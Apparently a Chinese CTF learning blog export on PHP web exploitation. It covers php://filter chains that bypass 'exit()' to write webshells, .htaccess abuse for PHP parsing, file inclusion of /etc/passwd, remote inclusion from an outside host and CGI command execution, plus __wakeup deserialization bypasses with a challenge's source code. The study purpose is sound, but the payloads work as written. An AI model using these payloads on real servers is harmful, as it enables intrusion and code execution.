title="大佬看到的一篇错误博客（原来我的想法和那博客一样是错误的）"></a>大佬看到的一篇错误博客（原来我的想法和那博客一样是错误的）</h4><p>payload:<code>php://filter/&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code></p><p>博客的说法</p><p>他的意思是代码粘起来：<code>&lt;?php exit();php://filter/&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code>之后<br>strip_tags去除内容后为：<code>&lt;?php exit();PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code></p><p>（我的错误理解是留下<code>&lt;?php exit();php://filter/PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code>）</p><p>。。。好像错的更加彻底</p><p><strong>真实情况</strong>（也是Boogipop大佬的理解）</p><p>测试代码</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;php://filter/string.strip_tags|convert.base64-decode/resource=a.php&#x27;</span>;<span class="hljs-variable">$content</span>=<span class="hljs-string">&#x27;?&gt;PD9waHAgcGhwaW5mbygpOz8+&#x27;</span>;<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;&lt;?php exit()&lt;?;&quot;</span>.<span class="hljs-variable">$content</span>);<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;a.php&quot;</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p>拼接后是<code>&lt;?php exit()&lt;?;?&gt;PD9waHAgcGhwaW5mbygpOz8+</code></p><p>真实情况，只剩base64代码，然后base64解密</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230902085745201.png" alt="image-20230902085745201"></p><p>所以<code>string.strip_tags</code>不是只会去除<code>&lt;?;?&gt;</code>中间的内容，那是错误的观念</p><h4 id="解决办法（2）rot13-（windows本地测试不通过）"><a href="#解决办法（2）rot13-（windows本地测试不通过）" class="headerlink" title="解决办法（2）rot13    （windows本地测试不通过）"></a>解决办法（2）rot13    （windows本地测试不通过）</h4><p>这个就方便多了，不会受到<code>=</code>的限制</p><p><code>php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=s1mple.php</code></p><p>测试情况</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903103600057.png" alt="image-20230903103600057"></p><p>生气，不管是正常的死亡代码还是这个变种，<code>rot13</code>都会报这个错误</p><h4 id="解决办法（3）-convert-iconv"><a href="#解决办法（3）-convert-iconv" class="headerlink" title="解决办法（3） convert.iconv"></a>解决办法（3） convert.iconv</h4><p>iconv拥有很多字符编码，利用convert.iconv 进行字符编码转化，这个涉及到filterchain的构造，内容挺多，这就只讲Boogipop大佬提及的</p><h5 id="usc-2"><a href="#usc-2" class="headerlink" title="usc-2"></a>usc-2</h5><p>每两个字符进行翻转   （一定要是偶数、否则报错）</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903111013076.png" alt="image-20230903111013076"></p><p><code>php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSs[m1lp]e;)&gt;?/resource=s1mple.php;</code></p><h5 id="usc-4"><a href="#usc-4" class="headerlink" title="usc-4"></a>usc-4</h5><p>就是4位一反转   (同理，需要4的倍数)</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903111239338.png" alt="image-20230903111239338"></p><p><code>php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@%20p(lavOP_$s[TS]pm1&gt;?;)/resource=s1mple.php</code></p><h5 id="utf-8到utf-7的转化"><a href="#utf-8到utf-7的转化" class="headerlink" title="utf-8到utf-7的转化"></a>utf-8到utf-7的转化</h5><p><code>=</code>会被转化为<code>+AD0-</code>     （<code>filterchain</code>构造需要）</p><p><code>php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=a.php</code></p><p><code>windows</code>没有<code>iconv</code>，但是我是能成功写入内容的（不太理解）</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903112719444.png" alt="image-20230903112719444"></p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903112735404.png" alt="image-20230903112735404"></p><h3 id="死亡代码变种（二）"><a href="#死亡代码变种（二）" class="headerlink" title="死亡代码变种（二）"></a>死亡代码变种（二）</h3><div class="code-wrapper"><pre><code class="hljs reasonml">file<span class="hljs-constructor">_put_contents($<span class="hljs-params">filename</span>, $<span class="hljs-params">content</span> . <span class="hljs-string">&quot;\nxxxxxx&quot;</span>)</span>;</code></pre></div><p>因为<code>php</code>有特殊的起始符和结束符，所以出题时一般会被禁用php</p><p>常见考点是利用<code>.htaccess</code>，<code>.htaccess</code>文件对其文件内容的格式很敏感，如果有杂糅的字符，就会出现错误，导致我们无法进行操作，所以这里我们必须采用<strong>注释符</strong>将杂糅的代码进行注释，然后才可以正常访问；</p><p>对于换行符我们直接进行 <code>\</code> 注释（应该是转义的意思），<code>#</code>注释杂糅的内容</p><p>`#&#96;一般放在行首，并且只能注释一行</p><p><code>php_value%20auto_prepend_file%20文件地址%0a%23\</code></p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903114418114.png" alt="image-20230903114418114"></p><p>Boogipop大佬参考的文章的作者的其他方法</p><p><a href="https://www.cnblogs.com/Wanghaoran-s1mple/p/13152075.html">https://www.cnblogs.com/Wanghaoran-s1mple/p/13152075.html</a></p><p><a href="https://www.cnblogs.com/Wanghaoran-s1mple/p/13232888.html">https://www.cnblogs.com/Wanghaoran-s1mple/p/13232888.html</a></p><h2 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h2><p>.htaccess 中有 <code>#</code> 单行注释符, 且支持 <code>\</code>拼接上下两行。</p><p>子目录中的<code>.htaccess</code>指令会覆盖父目录或者主配置文件中的<code>.htaccess</code>指令</p><p>apache2.conf   <code>AllowOverride All #启动.htaccess文件的使用</code><br>也可以将 .htaccess 修改为其他名<code>AccessFileName .config #将.htaccess修改为.config</code></p><h3 id="SetHandler"><a href="#SetHandler" class="headerlink" title="SetHandler"></a>SetHandler</h3><p><code>SetHandler application/x-httpd-php</code><br>此时当前目录及其子目录下所有文件都会被当做 <code>php</code> 解析（上传jpg文件但内容为一句话木马，也会被成功解析）<br><code>SetHandler server-status</code><br>这是查看apache的服务器信息的</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903115244293.png" alt="image-20230903115244293"></p><h3 id="AddHandler-AddType"><a href="#AddHandler-AddType" class="headerlink" title="AddHandler,AddType"></a>AddHandler,AddType</h3><blockquote><p>AddType application&#x2F;x-httpd-php .htm<br>#.htm后缀的文件视为php文件执行</p><p>AddHandler cgi-script .aaa<br>#后缀名为.aaa的文件视为cgi脚本执行</p><p>AddType application&#x2F;x-httpd-php png jpg gif<br>#将png，jpg，gif后缀名都视为php执行</p></blockquote><h3 id="php-value"><a href="#php-value" class="headerlink" title="php_value"></a>php_value</h3><p>当使用<code>PHP</code>作为<code>Apache</code>模块时，也可以用<code>Apache</code>的配置文件（例如 httpd.conf）和 <code>.htaccess </code>文件中的指令来修改 php 的配置设定。需要有<code>AllowOverride Options</code> 或<code>AllowOverride All </code>权限才可以。</p><p><code>.htaccess</code>只能用于 <code>PHP_INI_ALL</code> 或 <code>PHP_INI_PERDIR </code>类型的指令。</p><ol><li>auto_prepend_file：在主文件解析之前自动解析包含的文件</li><li>auto_append_file：在主文件解析后自动解析包含的文件</li></ol><p>如：<code>php_value auto_prepend_file 1.jpg</code> #每次访问一个<code>php</code>文件，都会先解析1.jpg图片，如果里面有代码就会执行</p><h3 id="php-flag-（控制开关）"><a href="#php-flag-（控制开关）" class="headerlink" title="php_flag   （控制开关）"></a>php_flag   （控制开关）</h3><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903120640554.png" alt="image-20230903120640554"></p><p>将其中的engine设为0可以关闭php解析从而达到源码泄露的目的 </p><p>（这里源码泄露的意思是）因为像<code>&lt;?php phpinfo();?&gt;</code>这样的php代码一般会被解析而无法显现，这里关闭解析，于是代码就会显示</p><p>如：<code>php_flag engine off</code></p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p><code>#</code>一般放在行首，并且只能注释一行</p><h4 id="多行注释-0a"><a href="#多行注释-0a" class="headerlink" title="多行注释         #%0a"></a>多行注释         #%0a</h4><div class="code-wrapper"><pre><code class="hljs angelscript">php_value <span class="hljs-built_in">auto</span>_prepend_fi\le <span class="hljs-number">1.</span>png# <span class="hljs-keyword">this</span> <span class="hljs-keyword">is</span> 注释</code></pre></div><p>里面的<code>\</code>并不只是单单的<code>\</code>，他实际上是<code>\%0a、</code>，转义了换行符</p><p>利用这种技巧用<code>#\%0a</code>来多行注释</p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="解析文件"><a href="#解析文件" class="headerlink" title="解析文件"></a>解析文件</h4><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment"># 将test.gif 当做 PHP 执行   </span><span class="hljs-section">&lt;FilesMatch  <span class="hljs-string">&quot;test.gif&quot;</span>&gt;</span><span class="hljs-attribute">SetHandler</span>  application/x-httpd-php<span class="hljs-section">&lt;/FilesMatch&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs applescript"><span class="hljs-comment"># 将 .png 当做 PHP 文件解析</span>AddType <span class="hljs-built_in">application</span>/x-httpd-php .png</code></pre></div><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p><code>php_value auto_prepend_file /etc/passwd</code></p><p>访问<code>php</code>文件时会先打开<code>/etc/passwd</code>   (<code>/etc/passwd</code>的内容在php文件内容前)</p><p><code>auto_append_file</code>同理 （内容在php文件内容之后）</p><h5 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h5><p>PHP 的<code>all_url_include</code>配置选项这个选项默认是关闭的，如果开启的话就可以远程包含。因为<code>all_url_include</code>的配置范围为<code> PHP_INI_SYSTEM</code>,所以无法利用<code>php_flag</code>在<code>.htaccess</code>中开启</p><p><code>php_value auto_append_file http://10.87.9.156/phpinfo.txt</code></p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903122210912.png" alt="image-20230903122210912"></p><p>太神奇了</p><h4 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h4><p><code>php_flag engine 0</code></p><p>在谷歌浏览器访问会显示源码，用其他浏览器访问会显示空白，还需查看源码，才可看到泄露的源码</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903122346792.png" alt="image-20230903122346792"></p><h4 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h4><p>条件：<code>all_url_fopen=on</code>,<code>all_url_include=on</code></p><div class="code-wrapper"><pre><code class="hljs angelscript">php_value <span class="hljs-built_in">auto</span>_append_file data:<span class="hljs-comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span></code></pre></div><h4 id="解析-htaccess"><a href="#解析-htaccess" class="headerlink" title="解析.htaccess"></a>解析.htaccess</h4><div class="code-wrapper"><pre><code class="hljs php-template"><span class="language-xml">php_value auto_append_file .htaccess</span><span class="language-xml">#</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span></code></pre></div><p><code>&lt;?php phpinfo();?&gt;</code>会被解析</p><p>这种方法在我们随便打开一个PHP文件后就会去解析.htaccess文件（这里的htaccess文件一定要和php文件在一个目录下！！！！）</p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903122707190.png" alt="image-20230903122707190"></p><p>二</p><p>这种适合同目录或子目录没有<code>php</code>文件。<br>需要先设置允许可访问 <code>.htaccess</code> 文件</p><div class="code-wrapper"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Files</span> ~ &quot;^<span class="hljs-attr">.ht</span>&quot;&gt;</span></span><span class="language-xml"> Require all granted</span><span class="language-xml"> Order allow,deny</span><span class="language-xml"> Allow from all</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">Files</span>&gt;</span></span><span class="language-xml">SetHandler application/x-httpd-php</span><span class="language-xml"># </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span></span></code></pre></div><p>上面的代码必须加，是允许访问htaccess文件</p><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><h5 id="cgi"><a href="#cgi" class="headerlink" title="cgi"></a>cgi</h5><p><code>cgi_module</code> 需要加载，即 <code>apache</code> 配置文件中有</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">LoadModule</span> cgi_module modules/mod_cgi.so</code></pre></div><p>.htaccess内容</p><div class="code-wrapper"><pre><code class="hljs mipsasm">Options ExecCGI <span class="hljs-comment">#允许CGI执行</span><span class="hljs-keyword">AddHandler </span>cgi-<span class="hljs-keyword">script </span>.xx <span class="hljs-comment">#将xx后缀名的文件，当做CGI程序进行解析</span></code></pre></div><p>ce.xx</p><div class="code-wrapper"><pre><code class="hljs d"><span class="hljs-meta">#!C:/Windows/System32/cmd.exe /k start calc.exe</span><span class="hljs-number">6</span></code></pre></div><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903123655129.png" alt="image-20230903123655129"></p><h5 id="fastcgi-（百闻不如一见）"><a href="#fastcgi-（百闻不如一见）" class="headerlink" title="fastcgi     （百闻不如一见）"></a>fastcgi     （百闻不如一见）</h5><p><code>mod_fcgid.so</code>需要被加载。即 <code>apache</code> 配置文件中有</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">LoadModule</span> fcgid_module modules/mod_fcgid.so</code></pre></div><p>.htaccess</p><div class="code-wrapper"><pre><code class="hljs jboss-cli">Options +ExecCGIAddHandler fcgid-script <span class="hljs-string">.xx</span>FcgidWrapper <span class="hljs-string">&quot;C:/Windows/System32/cmd.exe /k start calc.exe&quot;</span> <span class="hljs-string">.xx</span></code></pre></div><p>ce.xx 内容随意  （所以叫fast）</p><h4 id="自定义错误文件-（不太理解）"><a href="#自定义错误文件-（不太理解）" class="headerlink" title="自定义错误文件   （不太理解）"></a>自定义错误文件   （不太理解）</h4><p><code>error.php</code></p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;shell&#x27;</span>);<span class="hljs-comment">#报错页面</span></code></pre></div><p><code>.htaccess</code></p><div class="code-wrapper"><pre><code class="hljs awk">php_value error_log <span class="hljs-regexp">/tmp/</span>www<span class="hljs-regexp">/html/</span>shell.php php_value include_path <span class="hljs-string">&quot;&lt;?php phpinfo(); __halt_compiler();&quot;</span></code></pre></div><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903124241964.png" alt="image-20230903124241964"></p><p>会经过 html 编码，所以需要 UTF-7 来绕过。</p><div class="code-wrapper"><pre><code class="hljs dts"><span class="hljs-meta"># 第一次</span>php_value error_log <span class="hljs-keyword">/tmp/</span>shell <span class="hljs-meta">#定义错误路径</span><span class="hljs-meta">#---- <span class="hljs-string">&quot;&lt;?php phpinfo(); __halt_compiler();&quot;</span> in UTF-7:</span>php_value include_path <span class="hljs-string">&quot;+ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;</span><span class="hljs-meta"># 第二次</span>php_value include_path <span class="hljs-string">&quot;/tmp&quot;</span> <span class="hljs-meta">#将<span class="hljs-keyword">include</span>()的默认路径改变</span>php_flag zend.multibyte <span class="hljs-number">1</span>php_value zend.script_encoding <span class="hljs-string">&quot;UTF-7&quot;</span></code></pre></div><p><a href="https://www.cnblogs.com/tr1ple/p/11439994.html">X-NUCA-ezphp</a></p><h2 id="session-serialize-handler-三种引擎"><a href="#session-serialize-handler-三种引擎" class="headerlink" title="session.serialize_handler(三种引擎)"></a>session.serialize_handler(三种引擎)</h2><div class="code-wrapper"><pre><code class="hljs scss"><span class="hljs-built_in">php</span>(默认的）键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值php_binary   键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 <span class="hljs-built_in">serialize</span>() 函数反序列处理的值php_serialize (php&gt;=<span class="hljs-number">5.5</span>.<span class="hljs-number">4</span>)经过 <span class="hljs-built_in">serialize</span>() 函数反序列处理的数组</code></pre></div><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903144909405.png" alt="image-20230903144909405"></p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903144926904.png" alt="image-20230903144926904"></p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903144942736.png" alt="image-20230903144942736"></p><p>当一个服务器（session文件和PHPSESSID相同），的两个页面使用不同处理器就会存在phpsession反序列化漏洞</p><h2 id="利用session-upload-progress进行文件包含"><a href="#利用session-upload-progress进行文件包含" class="headerlink" title="利用session_upload_progress进行文件包含***"></a>利用session_upload_progress进行文件包含***</h2><p>挺重要的一个考点</p><p>原理看过很多次，但感觉要是遇到的话还是很迷茫,找不到题目,实际操作一次就会很清醒了）</p><p>这个似懂非懂就不写了</p><p>但真的非常重要</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>php的__wakeup绕过</title>
    <link href="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/"/>
    <url>/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="__wakeup绕过"></a>__wakeup绕过</h1><h2 id="cve-2016-7124"><a href="#cve-2016-7124" class="headerlink" title="cve-2016-7124"></a>cve-2016-7124</h2><p>影响范围：</p><ul><li>PHP5 &lt; 5.6.25</li><li>PHP7 &lt; 7.0.10</li></ul><blockquote><p>如果序列化字符串中表示对象属性个数的值大于真实的属性个数时，wakeup()的执行会被跳过。</p></blockquote><p>听名字很高大上，其实就是最常用的修改数字</p><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230903185255743.png" alt="image-20230903185255743"></p><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230903185345104.png" alt="image-20230903185345104"></p><h2 id="php引用赋值"><a href="#php引用赋值" class="headerlink" title="php引用赋值&amp;"></a>php引用赋值&amp;</h2><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230903185722842.png" alt="image-20230903185722842"></p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span> (<span class="hljs-params">&amp;<span class="hljs-variable">$a</span></span>)</span>&#123;     <span class="hljs-variable">$x</span>=&amp;<span class="hljs-variable">$a</span>;           <span class="hljs-comment">###共用一个地址</span>    <span class="hljs-variable">$x</span>=<span class="hljs-string">&#x27;123&#x27;</span>;&#125;<span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;11&#x27;</span>;<span class="hljs-title function_ invoke__">test</span>(<span class="hljs-variable">$a</span>);<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<span class="hljs-meta">?&gt;</span></code></pre></div><p>示例</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KeyPort</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;key=False;        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;wakeup)||!<span class="hljs-variable language_">$this</span>-&gt;wakeup)&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You get it!&quot;</span>;        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;wakeup=True;    &#125;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-variable">$a</span> = new KeyPort();<span class="hljs-variable">$a</span>-&gt;key = &amp;<span class="hljs-variable">$a</span>-&gt;wakeup;<span class="hljs-regexp">//</span><span class="hljs-variable">$a</span>-&gt;wakeup = &amp;<span class="hljs-variable">$a</span>-&gt;key;echo serialize(<span class="hljs-variable">$a</span>);</code></pre></div><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230903190353939.png" alt="image-20230903190353939"></p><h3 id="值恒相等"><a href="#值恒相等" class="headerlink" title="值恒相等"></a>值恒相等</h3><p>我记得好像见过要令两个值相等，但又不能赋值的情况（遇到再说吧）</p><p><code>$this→b = &amp;$this→a</code></p><h2 id="fast-destruct-（不仅是wakeup也能绕throws-new-Error）"><a href="#fast-destruct-（不仅是wakeup也能绕throws-new-Error）" class="headerlink" title="fast destruct  （不仅是wakeup也能绕throws new Error）"></a>fast destruct  （不仅是wakeup也能绕throws new Error）</h2><h3 id="追加总结，fast-destruct是绕过别的类里面的-wakeup，同一个类中的-destruct始终在同一个类中的-wakup之后执行（是在pop链的时候，只有一个类可以绕过）"><a href="#追加总结，fast-destruct是绕过别的类里面的-wakeup，同一个类中的-destruct始终在同一个类中的-wakup之后执行（是在pop链的时候，只有一个类可以绕过）" class="headerlink" title="追加总结，fast destruct是绕过别的类里面的__wakeup，同一个类中的__destruct始终在同一个类中的__wakup之后执行（是在pop链的时候，只有一个类可以绕过）"></a>追加总结，fast destruct是绕过别的类里面的<code>__wakeup</code>，同一个类中的<code>__destruct</code>始终在同一个类中的<code>__wakup</code>之后执行（是在pop链的时候，只有一个类可以绕过）</h3><ul><li>在PHP中如果单独执行<code>unserialize()</code>函数，则反序列化后得到的生命周期仅限于这个函数执行的生命周期，在执行完unserialize()函数时就会执行<code>__destruct()</code>方法</li><li>而如果将<code>unserialize()</code>函数执行后得到的字符串<strong>赋值给了一个变量</strong>，则反序列化的对象的生命周期就会变长，会一直到对象被销毁才执行析构方法</li></ul><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-variable">$a</span> = unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);      <span class="hljs-comment">##特征</span></code></pre></div><h3 id="在我看来，fast-destruct的原理就是利用反序列化字符串报错"><a href="#在我看来，fast-destruct的原理就是利用反序列化字符串报错" class="headerlink" title="在我看来，fast destruct的原理就是利用反序列化字符串报错"></a>在我看来，fast destruct的原理就是利用反序列化字符串报错</h3><div class="code-wrapper"><pre><code class="hljs css">正常反序列化的结果:a:<span class="hljs-number">2</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;classes&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;&#125;------------------------------------------------------------<span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;classes&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;     #减少末尾的&#125;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">3</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;classes&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;&#125;     #改变类属性的个数<span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;classes&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;;&#125;    #后面插入个;号</code></pre></div><p>(第二种那不就变得跟cve-2016那个一样了吗)</p><p>理论上只要不破坏链条的基本结构，其他的地方你随便改，使它报错即可</p><hr><p>DASCTF X GFCTF 2022十月挑战赛 easypop</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fine</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$content</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$content</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-variable">$cmd</span>;        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-variable">$content</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;cmd, <span class="hljs-variable">$this</span>-&gt;content);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Go listen to Jay Chou&#x27;s secret-code! Really nice&quot;</span>);    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">show</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ctf</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$time</span> = <span class="hljs-string">&quot;Two and a half years&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$ctf</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;ctf = <span class="hljs-variable">$ctf</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> <span 